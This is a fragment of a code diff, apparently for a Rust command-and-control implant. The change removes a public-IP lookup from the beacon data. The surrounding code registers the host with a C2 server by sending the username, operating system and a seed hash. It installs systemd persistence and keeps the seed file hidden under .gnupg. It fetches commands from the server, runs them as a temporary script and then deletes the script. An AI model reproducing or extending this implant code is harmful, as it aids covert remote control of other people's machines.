@@ -14,7 +14,6 @@ use self::crypto::sha2::Sha256;
 const CC_SERVER: &str = "http://localhost:41450";
 const REGISTER_URI: &str = "/convey/register/";
 const CMD_URI: &str = "/convey/cmd/";
-const GET_IP_SERVER: &str = "https://now-dns.com/ip";
 
 const HASH_TYPE: &str = "sha256sum";
 const SEED_DIR: &str = ".gnupg/.seeds";
@@ -139,9 +138,6 @@ fn register(seed_path: &str, user: &str) {
     let operating_sys = String::from_utf8_lossy(&operating_sys.stdout);
     let operating_sys = operating_sys.trim();
 
-    // Get public IP address
-    let ip_addr = get_ip_addr();
-
     // Get seed hash
     let hash_sum = get_seed_hash(&seed_path);
 
@@ -151,7 +147,6 @@ fn register(seed_path: &str, user: &str) {
         ("hash_sum", &hash_sum),
         ("operating_sys", &operating_sys),
         ("user", &user),
-        ("ip_addr", &ip_addr),
     ];
 
     // Get URL to get command from
@@ -220,16 +215,12 @@ fn init_systemd(user: &str) {
 
 
 fn run_cmd(temp_script_path: &str, seed_path: &str) {
-    // Get public IP address
-    let ip_addr = get_ip_addr();
-
     // Get seed hash
     let hash_sum = get_seed_hash(&seed_path);
 
     // Set params for POST request
     let params = [
-        ("hash_sum", &hash_sum),
-        ("ip_addr", &ip_addr),
+        ("hash_sum", &hash_sum)
     ];
 
     // Get URL to get command from
@@ -263,17 +254,6 @@ fn run_cmd(temp_script_path: &str, seed_path: &str) {
         .output().expect("Failed to run command");
     std::fs::remove_file(&temp_script_path)
         .expect("Failed to remove file");
-}
-
-
-fn get_ip_addr() -> String {
-    // Contact server to get IP addr. Return as string
-    let mut res = reqwest::get(GET_IP_SERVER)
-        .expect("Failed to get IP from server");
-    let mut ip_addr = String::new();
-    res.read_to_string(&mut ip_addr)
-        .expect("Failed to read to string");
-    ip_addr
 }
 
 
